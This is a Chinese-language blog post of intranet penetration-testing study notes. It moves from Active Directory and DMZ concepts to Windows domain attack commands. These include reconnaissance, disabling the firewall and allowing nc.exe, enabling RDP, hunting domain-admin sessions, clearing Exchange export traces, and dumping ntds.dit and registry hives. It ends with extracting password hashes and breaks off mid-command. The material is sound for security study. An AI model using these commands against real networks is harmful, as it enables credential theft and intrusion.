    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="内网安全第一章"><a href="#内网安全第一章" class="headerlink" title="内网安全第一章"></a>内网安全第一章</h1><h2 id="内网基础知识"><a href="#内网基础知识" class="headerlink" title="内网基础知识"></a>内网基础知识</h2><p><strong>工作组</strong>:工作组（ Work Group)，在一个大的单位内，可能有成百上千台电脑互相连接组成局域网，它们都会列在“网络（网上邻居)”内，如果这些电脑不分组，可想而知有多么混乱，要找一台电脑很困难。为了解决这一问题，就有了“工作组”这个概念，将不同的电脑一般按功能(或部门）分别列入不同的工作组中，如技术部的电脑都列入“技术部”工作组中，行政部的电脑都列入“行政部”工作组中。你要访问某个部门的资源，就在“网络”里找到那个部门的工作组名，双击就可以看到那个部门的所有电脑了。相比不分组的情况就有序的多了，尤其是对于大型局域网络来说。</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628095849118.png" alt="image-20220628095849118"></p><p><strong>域</strong>(Domain)是一个有安全边界的计算机集合（安全边界意思是在两个域中，一个域中的用户无法访问另一个域中的资源），可以简单的把域理解成升级版的“工作组”，相比工作组而言,它有一个更加严格的安全管理控制机制,如果你想访问域内的资源,必须拥有一个合法的身份登陆到该域中,而你对该域内的资源拥有什么样的权限,还需要取决于你在该域中的用户身份。<br><strong>域控制器</strong>（Domain Controller，简写为Dc）是一个域中的一台类似管理服务器的计算机，相当于一个单位的门卫一样，它负责每一台联入的电脑和用户的验证工作，域内电脑如果想互相访问首先都是经过它的审核。</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628100052625.png" alt="image-20220628100052625"></p><p><strong>域的分类:</strong></p><p><strong>单域</strong><br>在一般的具有固定地理位置的小公司里，建立一个域就可以满足所需。·一般在一个域内要建立至少两个域服务器，一个作为Dc，一个是备份DC。如果没有第二个备份Dc，那么一旦DC瘫痪了，则域内的其他用户就不能登陆该域了，因为活动目录的数据库（包括用户的帐号信息)是存储在DC中的。而有一台备份域控制器（BDC），则至少该域还能正常使用，期间把瘫痪的Dc恢复了就行了。</p><p><strong>父域</strong></p><p>出于管理及其他一些需求，需要在网络中划分多个域，第一个域称为父域，各分部的域称为该域的子域。<br>比如一个大公司，它的不同分公司在不同的地理位置，则需父域及子域这样的结构。<br>如果把不同地理位置的分公司放在同一个域内，那么他们之间信息交互（包括同步，复制等）所花费的时间会比较长，而且占用的带宽也比较大。(因为在同一个域内，信息交互的条目是很多的，而且不压缩;而在域和域之间，信息交互的条目相对较少，而且压缩。）<br>还有一个好处，就是子公司可以通过自己的域来管理自己的资源。还有一种情况，就是出于安全策略的考虑，因为每个域都有自己独有的安全策略。比如一个公司的财务部门希望能使用特定的安全策略(包括帐号密码策略等），那么可以将财务部门做成一个子域来单独管理。</p><p><strong>域树</strong></p><p>域树指若干个域通过建立信任关系组成的集合。一个域管理员只能管理本域的内部，不能访问或者管理其他的域，二个域之间相互访问则需要建立信任关系(Trust Relation)。<br>信任关系是连接在域与域之间的桥梁。域树内的父域与子域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理，以及相互通信和数据传输。</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628100413944.png" alt="image-20220628100413944"></p><p><strong>域森林</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628100503104.png" alt="image-20220628100503104"></p><p><strong>DNS域名服务器</strong>是进行域名(domain name)和与之相对应的IP地址(IPaddress)转换的服务器。<br>在域树的介绍中，可以看到域树中的域的名字和DNS域的名字非常相似，实际上域的名字就是DNS域的名字，因为域中的计算机使用DNS来定位域控制器和服务器以及其他计算机、网络服务等。<br>一般情况下,我们在内网渗透时就通过寻找DNS服务器来定位域控制器，因为通常DNS服务器和域控制器会处在同一台机器上。</p><p><strong>活动目录</strong>（Active Directory）是域环境中提供目录服务的组件。目录是什么?目录就是存储有关网络对象（如用户、组、计算机、共享资源、打印机和联系人等）的信息。目录服务是帮助用户快速准确的从目录中查找到他所需要的信息的服务。<br>如果将企业的内网看成是一本字典，那么内网里的资源就是字典的内容，活动目录就相当于字典的索引。即活动目录存储的是网络中所有资源的快捷方式，用户通过寻找快捷方式而定位资源。</p><p><strong>逻辑结构</strong></p><p>在活动目录中，管理员可以完全忽略被管理对象的具体地理位置，而将这些对象按照一定的方式放置在不同的容器中。由于这种组织对象的做法不考虑被管理对象的具体地理位置，这种组织框架称为“逻辑结构”。<br>活动目录的逻辑结构就包括上面讲到的组织单元（ou)、域(domain)、域树( tree)、域森林（forest）。在域树内的所有域共享一个活动目录，这个活动目录内的数据分散地存储在各个域内，且每一个域只存储该域内的数据。</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628102316204.png" alt="image-20220628102316204"></p><p><strong>活动目录主要功能</strong></p><p>帐号集中管理，所有帐号均存在服务器上,方便对帐号的重命令/重置密码。<br>软件集中管理，统一推送软件，统一安装网络打印机等。利用软件发布策略分发软件,可以让用户自由选择安装软件。<br>环境集中管理，利用AD可以统一客户端桌面,IE,TCP/IP等设置。<br>增强安全性，统一部署杀毒软件和扫毒任务，集中化管理用户的计算机权限、统一制订用户密码策略等，可监控网络，资料统一管理。更可靠，更少的宕机时间。如:利用AD控制用户访问权限，利用群集、负载均衡等技术对文件服务器进行容灾设定，更可靠，宕机时间 少。活动目录为Microsoft统一管理的基础平台，其它isa,exchange,sms等服务都依赖于这个基础平台。</p><p><strong>AD和DC区别</strong></p><p>如果网络规模较大，我们就会考虑把网络中的众多对象:计算机、用户、用户组、打印机、共享文件等，分门别类、井然有序地放在一个大仓库中，并做好检索信息，以利于查找、管理和使用这些对象（资源）。这个有层次结构的数据库，就是活动目录数据库，简称AD库。那么我们应该把这个数据库放在哪台计算机上呢?规定是这样的，我们把存放有活动目录数据库的计算机就称为Dc。所以说我们要实现域环境，其实就是要安装AD，当内网中的一台计算机安装了AD后，它就变成了DC。</p><p><strong>安全域的划分</strong></p><p>安全域划分的目的是将一组安全等级相同的计算机划入同一个网段内，这一网段内的计算机拥有相同的网络边界，在网络边界上采用防火墙部署来实现对其他安全域的NACL(网络访问控制策略），允许哪些IP访问此域、不允许哪些访问此域;允许此域访问哪些IP/网段、不允许访问哪些IP/网段。使得其风险最小化，当发生攻击时可以将威胁最大化的隔离，减少对域内计算机的影响。</p><p><strong>DMZ</strong></p><p>DMZ称为“隔离区”，也称“非军事化区”。是为了解决安装防火墙后外部网络不能访问内部网络服务器的问题，而设立的一个非安全系统与安全系统之间的缓冲区。<br>这个缓冲区位于企业内部网络和外部网络之间的小网络区域内，在这个小网络区域内可以放置一些必须公开的服务器设施，如企业Web服务器、FTP服务器和论坛等。<br>另一方面，通过这样一个DMz区域，更加有效地保护了内部网络，因为这种网络部署，比起一般的防火墙方案，对攻击者来说又多了一道关卡。</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628103312842.png" alt="image-20220628103312842"></p><p><strong>DMZ屏障功能</strong></p><p>(1) 内网可以访问外网<br>内网的角户需要自由地访问外网。在这一策略中，防火墙需要执行NAT。</p><p>(2) 内网可以访问DMZ<br>此策略使内网用户可以使用或者管理DMZ中的服务器。</p><p>(3) 外网不能访问内网<br>这是防火墙的基本策略了，内网中存放的是公司内部数据，显然这些数据是不允许外网的用户进行访问的。如果耍访问，就要通过VPN方式来进行。</p><p>(4) 外网可以访问DMZ<br>DMZ中的服务器需要为外界提供服务，所以外网必须可以访问DMZ。同时，外网访问DMZ需要由防火墙完成对外地址到服务器实际地址的转换。</p><p>(5) DMZ不能访问内网<br>如不执行此策略，则当入侵者攻陷DMZ时，内部网络将不会受保护。</p><p>(6）DMZ不能访问外网<br>此条策略也有例外，比如我们的例子中，在DMZ中放置邮件服务器时，就需要访问外网，否则将不能正常工作。</p><p><strong>域中计算机分类</strong></p><p>域控制器-成员服务器-客户机-独立服务器</p><p>域控制器是存放活动目录数据库的，是域中必须要有的，而其他三种则不是必须的，也就是说最简单的域可以只包含一台计算机，这台计算机就是该域的域控制器。<br>域中各个服务器的角色也是可以改变的，例如域服务器在删除活动目录时，如果是域中最后一个域控制器，则该域服务器会成为独立服务器，如果不是域中唯一的域控制器，则将使该服务器成为成员服务器。同时独立服务器既可以转换为域控制器，也可以加入到某个域成为成员服务器。</p><p><strong>内权限解读:</strong></p><p><strong>域本地组</strong>，多域用户访问单域资源（访问同一个域)。可以从任何域添加用户账户、通用组和全局组，只能在其所在域内指派权限。域本地组不能嵌套于其他组中。它主要是用于授予位于本域资源的访问权限</p><p><strong>全局组</strong>，单域用户访问多域资源（必须是同一个域里面的用户）。只能在创建该全局组的域上进行添加用户和全局组，可以在域林中的任何域中指派权限，全局组可以嵌套在其他组中。</p><p><strong>通用组</strong>，通用组成员来自域林中任何域中的用户账户、全局组和其他的通用组，可以在该域林中的任何域中指派权限，可以嵌套于其他域组中。非常适于域林中的跨域访问。</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628104718578.png" alt="image-20220628104718578"></p><p><strong>A-G-DL-P策略</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628154433781.png" alt="image-20220628154433781"></p><p><strong>本地域组的权限</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628155157050.png" alt="image-20220628155157050"></p><p><strong>全局组、通用组的权限</strong></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220628155303297.png" alt="image-20220628155303297"></p><h2 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h2><p><strong>工作组信息搜集</strong></p><p><strong>本机信息收集</strong></p><p>查询网络配置</p><pre><code>ipconfig /all</code></pre><p>查询用户列表</p><pre><code>net usernet localgroup administratorsquery user ||qwinsta 查看当前在线用户</code></pre><p>查询进程列表</p><pre><code>tasklist /vwmic process list brief</code></pre><p>查询操作系统及安装软件版本信息</p><pre><code>获取操作系统和版本信息systeminfo查看安装软件以及版本路径wmic product name,versionpowershell &quot;Get-WmiObject -class Win32_Product | Select-Object -Property name,version&quot;</code></pre><p>查询端口列表</p><pre><code>netstat -ano</code></pre><p>查询补丁列表</p><pre><code>systeminfoWmic qfe get Caption,Description,HotFixID,InstalledOn</code></pre><p>查询本机共享</p><pre><code>net sharewmic share get name,path,status</code></pre><p>查询防火墙配置</p><pre><code>查看防火墙配置:netsh firewall show config关闭防火墙:Windows server 2003系统及其以前：netsh firewall set opmode disableWindows server 2003以后系统版本：netsh advfirewall set allprofiles state off修改防火墙配置windows server 2003系统及之前版本，允许指定程序全部连接:netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enablewindows server 2003之后系统版本:允许指定程序接入netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C: \nc.exe&quot;允许指定程序连出netsh advfirewall firewall add rule name=&quot;Allow nc&quot; dir=out action=allow program=&quot;C: \nc.exe&quot;允许3389端口放行netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow </code></pre><p>查询并开启远程连接服务</p><pre><code>查询远程连接端口Reg query &quot;hkey_local_machine\system\currentcontrolset\control\terminal server\winstations\RDP-Tcp&quot; /v portnumberwindows server 2008和windows server 2012开启3389方法(win7只可以用前两条):wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS != &quot;&quot;) call setallowtsconnections 1  wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName =&#39;RDP-Tcp&#39;) call setuserauthenticationrequired 1 reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /fwindows server 2003和windows xp:wmic path win32_terminalservicesetting where (__CLASS != &quot;&quot;) call setallowtsconnections 1以上前提条件是确保Windows Management Instrumentation（Winmgmt）服务已正常启动，权限的话需要administrator及以上</code></pre><p>查询当前权限</p><pre><code>whoami whoami /all #获取域SIDnet user XXX /domain 获取指定账户的详细信息</code></pre><p>判断是否有域</p><pre><code>ipconfig /allsysteminfonet config workstationnet time /domain1.存在域，当前不是域用户2.存在域，当前是域用户3.不存在域</code></pre><p><strong>域内存活主机探测</strong></p><p><strong>1.利用NetBIOS快速探测内网</strong></p><p>工具:Nbtscan</p><p>使用方法:nbtscan.exe IP</p><p><strong>2.利用icmp探测内网</strong></p><pre><code>for /L %l in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%l | findstr &quot;TTL=&quot;</code></pre><p><strong>3.利用arp扫描完整探测内网</strong></p><p>1.arp-scan</p><p>2.Invoke-ARPScan.ps1</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220630100231019.png" alt="image-20220630100231019"></p><p><strong>4.利用常规tcp/udp端口扫描探测内网</strong></p><p>工具:scanline</p><pre><code>scanline -h -t 22,80-89,110,389,445,3389,1099,1433,2049,6379,7001,8080,1521,3306,3389,5432 -u 53,161,137,139 -O c:\windows\temp\sl_res.txt  -p 192.168.4.1-254 /b</code></pre><p><strong>域内端口扫描</strong></p><p><strong>1.telnet探测</strong></p><pre><code>telnet ip 端口</code></pre><p><strong>2.S扫描器</strong></p><pre><code>S.exe TCP 192.168.1.1192.168.1.254 445,3389,1433,7001,1099,8080,80,22,23,21,25,110,3306,5432,1521,6379,2049,111256 /Banner /save</code></pre><p><strong>域内基础信息收集</strong></p><pre><code>net view /domainnet view /domain:XXXnet group /domainnet group &quot;domain computers&quot; /domainnet accounts /domainnltest /domain_trusts</code></pre><p><strong>域内控制器的查找</strong></p><pre><code>nltest /DCLIST:XXXNslookup -type=SRV _ldap._tcpnet time /domainnet group &quot;Domain Controllers&quot; /domainnetdom query pdc</code></pre><p><strong>域内用户和管理员</strong></p><pre><code>查询所有域用户列表net user /domainwmic useraccount get /alldsquery usernet localgroup administrators /domain查询域管理员用户组net group &quot;domain admins&quot; /domainnet group &quot;Enterprise Admins&quot; /domain</code></pre><p><strong>查找域管理进程</strong></p><p><strong>1.本机检查</strong></p><ul><li>获取域管理员列表 A,B,C</li><li>查看本机所有进程</li><li>交叉</li></ul><pre><code>1.获取域管理员列表net group &quot;Domain Admins&quot; /domain2.列出本机所有进程及进程用户tasklist /v3.寻找是否有进程所有者位域管理员的进程</code></pre><p><strong>2.查询域控制器的域用户会话</strong></p><pre><code>1.收集域控制器的列表net group &quot;Domain Controllers&quot; /domain2.收集域管理员的列表net group &quot;Domain Admins&quot; /domain3.使用Netsess.exe查询每个域控制器收集所有活动域会话的列表Netsess.exe -h4.将域管理员列表与活动会话列表交叉引用，以确定哪些IP地址具有活动域令牌。</code></pre><p><strong>3.扫描远程系统上运行的任务</strong></p><pre><code>1.收集域管理员的列表net group &quot;Domain Admins&quot; /domain3.运行脚本FOR /F %i in (ips.txt) DO @echo [+] %i &amp;&amp; @tasklist /V /S %i /U user /P password 2&gt;NUL &gt; output.txt &amp;&amp; FOR /F %n in (names.txt) DO @type output.txt | findstr %n &gt; NUL &amp;&amp; echo [!] %n was found running a process on %i &amp;&amp; pause</code></pre><p><strong>4.扫描远程系统上的NetBIOS信息</strong></p><pre><code>for /F %i in (ips.txt) do @echo [+] Checking %i &amp;&amp; nbtstat -A %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr /I %n &gt; NUL &amp;&amp; echo [!] %n was found logged into %i</code></pre><p><strong>PowerShell收集域信息</strong></p><p>PowerShell版本</p><ul><li>2.0 win2008,win7</li><li>3.0 win2012,win8</li><li>4.0 win2012R2,win8.1</li><li>5.0 win2016,win10</li></ul><p>PowerShell策略</p><pre><code>Restricted #不能执行任何脚本Allsigned #只允许执行正规签名的脚本Unrestricted #执行任意脚本RemoteSigned #本机执行脚本不受限制，执行远程脚本，必须经过签名</code></pre><p>修改策略</p><pre><code>Get-Executionpolicy  #查看当前策略Set-Executionpolicy Unrestricted # 修改策略</code></pre><p><strong>使用Powerview进行信息搜集</strong></p><pre><code>-exec bypassImport-Module.\PowerView.ps1</code></pre><p>常用命令:</p><pre><code>Import-Module为powershell导入脚本命令，这里假设我们下载的powerview.ps1脚本在C:\PowerView.ps1命令格式：powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module C:\PowerView.ps1; powerview的命令参数&#125;&quot; 定位域管理员powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module C:\PowerView.ps1; Invoke-UserHunter&#125;&quot; 更多PowerView命令参数Get-NetDomain: 获取当前用户所在域的名称Get-NetUser: 获取所有用户的详细信息Get-NetDomainController: 获取所有域控制器的信息Get-NetComputer: 获取域内所有机器的详细信息Get-NetOU: 获取域中的OU信息Get-NetGroup: 获取所有域内组和组成员信息Get-NetFileServer: 根据SPN获取当前域使用的文件服务器信息Get-NetShare: 获取当前域内所有网络共享信息Get-NetSession: 获取指定服务器的会话Get-NetRDPSession: 获取指定服务器的远程连接Get-NetProcess: 获取远程主机的进程Get-UserEvent: 获取指定用户的日志Get-ADObiect: 获取活动目录的对象Get-NetGPO: 获取域内所有的组策略对象Get-DomainPolicy: 获取域默认策略或域控制器策略Invoke-UserHunter: 获取域用户登录的计算机信息及该用户是否有本地管理员权限Invoke-ProcessHunter: 通过查询域内所有的机器进程找到特定用户Invoke-UserEvenHunter: 根据用户日志查询某域用户登录过哪些域机器。</code></pre><h2 id="隐藏通信隧道技术"><a href="#隐藏通信隧道技术" class="headerlink" title="隐藏通信隧道技术"></a>隐藏通信隧道技术</h2><p>网络层隧道:</p><ul><li><p>IPv6隧道</p></li><li><p>ICMP隧道 (ping ip)</p></li></ul><p>传输层隧道:</p><ul><li>TCP (nc ip port)</li><li>UDP</li></ul><p>应用层隧道:</p><ul><li>SSH</li><li>HTTP(curl ip:port)</li><li>DNS(nslookup <a href="http://www.baidu.com/">www.baidu.com</a> vps-ip)(dig @vps-ip <a href="http://www.baidu.com/">www.baidu.com</a>)</li></ul><p><strong>ICMP隧道</strong></p><p>ICMP隧道工具有：PingTunnel、icmptunnel、icmpsh、powershell、icmp等</p><h2 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h2><p>exchange邮件服务器</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220701171227982.png" alt="image-20220701171227982"></p><p>客户端/远程访问接口和协议</p><ul><li>OWA</li><li>ECP</li><li>EWS</li></ul><p>基于端口扫描发现:</p><ul><li>25端口 SMTP的指纹显示为Exchange smtpd</li><li>80端口为 iis 8.5</li><li>443端口</li></ul><p>SPN查询</p><ul><li><pre><code>setspn -T pentest.com -F -Q */*</code></pre></li></ul><p><strong>Exchange基本操作</strong></p><p>查看Mailbox数据库</p><ul><li><pre><code>Get-MailboxDatabase -server &quot;Exchange1&quot;</code></pre></li><li><pre><code>add-pssnapin microsoft.exchange*</code></pre></li></ul><p>获取现有用户邮件地址</p><ul><li>查看全部用户邮箱使用信息</li></ul><pre><code>Get-Mailbox | Format-Tables Name,WindowsEmailAddress</code></pre><ul><li>查看指定用户邮箱使用信息</li></ul><pre><code>get-mailboxstatistics -identity administrator | Select DisplayName,ItemCount,TotalltemSize,LastLogonTime</code></pre><ul><li>查看全部用户邮箱使用信息</li></ul><pre><code>Get-Mailbox -ResultSize Unlimited | Get-MailboxStatistics | Sort-Object TotalltemSize-Descend</code></pre><p><strong>添加权限</strong></p><ul><li><p>查看用户角色权限</p><pre><code>Get-ManagementRoleAssignment -role &quot;Mailbox Import Export&quot; | Format-List RoleAssigneeName</code></pre></li><li><p>添加用户角色权限</p></li></ul><pre><code>New-ManagementRoleAssignment -Name &quot;Import Export_Domain Admins&quot; -User &quot;Administrator&quot; -Role &quot;Mailbox Import Export&quot;</code></pre><ul><li>删除用户角色权限</li></ul><pre><code>Remove-ManagementRoleAssignment &quot;Import Export_Domain Admins&quot; -Confirm:$false</code></pre><p><strong>设置网络共享文件夹</strong></p><pre><code>net share inetpub=c:\inetpub /grant:everyone,full</code></pre><p><strong>清理痕迹</strong></p><ul><li>查看之前产生的导出请求记录</li></ul><pre><code>Get-MailboxExportRequest</code></pre><ul><li>删除导出请求记录</li></ul><pre><code>Remove-MailboxExportRequest -Identity Administrator\mailboxexport</code></pre><h2 id="攻击域控制器"><a href="#攻击域控制器" class="headerlink" title="攻击域控制器"></a>攻击域控制器</h2><h3 id="导出ntds-dit工具使用"><a href="#导出ntds-dit工具使用" class="headerlink" title="导出ntds.dit工具使用"></a><strong>导出ntds.dit工具使用</strong></h3><h4 id="ntdsutil工具提取"><a href="#ntdsutil工具提取" class="headerlink" title="ntdsutil工具提取"></a>ntdsutil工具提取</h4><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702110915019.png" alt="image-20220702110915019"></p><p>命令:</p><p>创建快照:</p><pre><code>ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</code></pre><p>挂载快照:</p><pre><code>ntdsutil snapshot &quot;mount &#123;GUID&#125;&quot; quit quit</code></pre><p>拷贝快照:</p><pre><code>copy C:\$SNAP_201808131112_VOLUMEC$\windows\ntds\ntds.dit c:\windows\temp\ntds.dit</code></pre><p>卸载并删除快照:</p><pre><code>ntdsutil snapshot &quot;unmount &#123;GUID&#125;&quot; &quot;delete &#123;GUID&#125;&quot; quit quit</code></pre><p>查看快照</p><pre><code>ntdsutil snapshot &quot;List All&quot; quit quit</code></pre><h4 id="vssadmin工具导出"><a href="#vssadmin工具导出" class="headerlink" title="vssadmin工具导出"></a>vssadmin工具导出</h4><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702112559750.png" alt="image-20220702112559750"></p><p>命令:</p><p>创建快照:</p><pre><code>vssadmin create shadow /for=c:</code></pre><p>复制文件</p><pre><code>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\windows\NTDS\ntds.dit c:\ntds,dit</code></pre><p>删除快照</p><pre><code>vssadmin delete shadows /for=c : /quite</code></pre><h4 id="利用vssown-vbs提取"><a href="#利用vssown-vbs提取" class="headerlink" title="利用vssown.vbs提取"></a>利用vssown.vbs提取</h4><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702113237136.png" alt="image-20220702113237136"></p><pre><code>https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs</code></pre><pre><code>cscript vssown.vbs /start #启动卷影复制服务cscipt vssown.vbs/create c #创建一个c盘的卷影副本copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\windows\NTDS\ntds.dit c:\ntds,ditescript vssown.vbs /list #列出当前卷影副本escript vssown.vbs /delete #删除卷影副本</code></pre><h4 id="NTDSUTIL的IFM"><a href="#NTDSUTIL的IFM" class="headerlink" title="NTDSUTIL的IFM"></a>NTDSUTIL的IFM</h4><pre><code>ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:/test&quot;q q</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702114121276.png" alt="image-20220702114121276"></p><h4 id="利用powershell"><a href="#利用powershell" class="headerlink" title="利用powershell"></a>利用powershell</h4><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702114210607.png" alt="image-20220702114210607"></p><h4 id="DiskShadow"><a href="#DiskShadow" class="headerlink" title="DiskShadow"></a>DiskShadow</h4><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702151613418.png" alt="image-20220702151613418"></p><p>DiskShadow可以用来执行命令</p><p>示例:</p><p>将命令写入文件:</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702153003868.png" alt="image-20220702153003868"></p><p>使用diskshadow执行</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702153216260.png" alt="image-20220702153216260"></p><p>使用diskshadow导出ntds.dit</p><p>将下列命令写入到command.txt文件</p><pre><code>set context persistent nowritersadd volume c: alias someAliascreateexpose %someAlias% k:exec &quot;cmd.exe&quot; /c copy k:\\windows\\ntds\\ntds.dit c:\\ntds.ditdelete shadows alllist shadows allresetexit</code></pre><p>然后执行</p><pre><code>diskshadow /s C:\\command.txt # 注意这里需要进入C:\Windows\System32目录下执行，否则会报错</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702154731904.png" alt="image-20220702154731904"></p><p>导出ntds.dit后，可以将system.hive转储。因为system.hive中存放着ntds.dit 的密钥，所以没有该密钥，将无法查看ntds.dit中的信息</p><p>system.hive文件在</p><pre><code>C:\Windows\System32\config</code></pre><p>直接使用注册表命令将system.live文件导出到当前路径</p><pre><code>reg save hklm\system system.hive #同理sam也可以这样导出 reg save hklm\sam sam.hive</code></pre><h3 id="解析ntds-dit"><a href="#解析ntds-dit" class="headerlink" title="解析ntds.dit"></a><strong>解析ntds.dit</strong></h3><h4 id="使用esedbexport和ntdsxtract恢复ntds-dit提取其散列值"><a href="#使用esedbexport和ntdsxtract恢复ntds-dit提取其散列值" class="headerlink" title="使用esedbexport和ntdsxtract恢复ntds.dit提取其散列值"></a>使用esedbexport和ntdsxtract恢复ntds.dit提取其散列值</h4><p>esedbexport安装:</p><p>在kali下载libesedb</p><pre><code class="shell">wget https://github.com/libyal/libesedb/releases/download/20210424/libesedb-experimental-20210424.tar.gz</code></pre><p>下载安装依赖环境</p><pre><code class="shell">apt-get install autoconf automake autopoint libtool pkg-config</code></pre><p>解压</p><pre><code class="shell">tar -xzvf libesedb-experimental-20210424.tar.gz</code></pre><p>配置</p><pre><code class="shell">cd libesedb-20210424./configure</code></pre><p>编译</p><pre><code class="shell">make</code></pre><p>安装</p><pre><code class="shell">sudo make install</code></pre><p>配置</p><pre><code class="shell">sudo ldconfig</code></pre><p>安装完成后会在<code>/usr/local/bin</code>目录下看到<code>esedbexport</code>程序</p><p>将<code>ntds.dit</code>文件上传到kali中，使用<code>esedbexport</code>进行恢复操作</p><pre><code class="shell">esedbexport -m table ntds.dit</code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220702170750923.png" alt="image-20220702170750923"></p><p>提取根据ntds.dit的散列值提取其内容的方法:</p><p>使用ntdsxtract</p><p>安装命令:</p><pre><code class="shell">git clone https://github.com/csababarta/ntdsxtract.gitcd ntdsxtract/python setup.py build &amp;&amp; python setup.py install</code></pre><p>安装完成后，我们将上一步中导出的“ntds.dit.export”文件夹中的datatable.3、link_table.5这两个表和之前获得的“SYSTEM”文件一并放入ntdsxtract的文件夹中。然后我们就可以执行如下命令，将域内的所有用户及散列值导出到result.txt文件中</p><pre><code class="shell">dsusers.py &lt;datatable&gt; &lt;link_table&gt; &lt;output_dir&gt; --syshive &lt;systemhive&gt; --passwordhashes &lt;format options&gt;</code></pre><p>命令:</p><pre><code class="shell">python dsusers.py ntds.dit.export/datatable.3 ntds.dit.export/link_table.5 output --syshive system.hive --passwordhashes --pwdformat ocl --ntoutfile ntout --lmoutfile lmout | tee result.txt# –pwdformat选项是选择以什么格式进行提取，有john(John format)、ocl(oclHashcat)、ophc(OphCrack)三个选项。</code></pre><p>最终获得文件</p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220706162054315.png" alt="image-20220706162054315"></p><p>Ntdsxtract中还具有一个“dscomputers.py”工具可以从分离出来的表中提取域中计算机信息。这对于离线分析目标信息是非常有用的。</p><p>在使用过程中，需要对它提供datatable，输出目录以及输出文件，输出文件的格式为csv：</p><pre><code class="shell">python dscomputers.py ntds.dit.export/datatable.3 computer_output --csvoutfile domain_computers_info.csv </code></pre><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220706162710090.png" alt="image-20220706162710090"></p><p><img src="/2022/07/13/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AF%87/image-20220706162817060.png" alt="image-20220706162817060"></p><h4 id="使用Impacket中的secretsdump"><a href="#使用Impacket中的secretsdump" class="headerlink" title="使用Impacket中的secretsdump"></a>使用Impacket中的secretsdump</h4><p>下载地址：<a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p><p>secretsdump.py是Impacket工具包中的一个脚本，该脚本实现了多种不需要在远程主机上执行任何代理的情况下转储机密数据的技术。对于SAM和LSA Secrets（包括缓存的凭据），我们尽可能的尝试从注册表中读取，然后将hives保存在目标系统（％SYSTEMROOT％\Temp目录）中，并从那里读取其余的数据。</p><p>secretsdump.py有一个本地选项，可以解析Ntds.dit文件并从Ntds.dit中提取哈希散列值和域信息。在此之前，我们必须获取到Ntds.dit和SYSTEM这两个文件。</p><p>使用方法:</p><pre><code class="shell">git clone 